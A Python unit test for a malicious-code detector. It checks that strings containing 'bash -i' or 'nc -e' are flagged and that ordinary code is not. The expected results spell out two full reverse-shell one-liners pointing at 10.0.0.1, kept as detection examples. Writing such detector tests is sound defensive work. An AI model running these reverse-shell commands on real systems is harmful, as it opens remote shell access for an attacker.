from unittest import TestCase

from malicious_code_detector import MaliciousCodeDetector, MaliciousPattern


class Test(TestCase):

    def test_detect_malicious_code(self):
        mcd = MaliciousCodeDetector()

        self.assertEqual(
            mcd.detect_malicious_code("bash -i"),
            ("bash -i", MaliciousPattern("bash -i", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"))
        )
        self.assertEqual(
            mcd.detect_malicious_code("test; nc -e; //dummy"),
            ("test; nc -e; //dummy", MaliciousPattern("nc -e", "nc -e /bin/sh 10.0.0.1 1234"))
        )

        self.assertEqual(mcd.detect_malicious_code("console.log('normal code');"), None)
        self.assertEqual(mcd.detect_malicious_code(""), None)

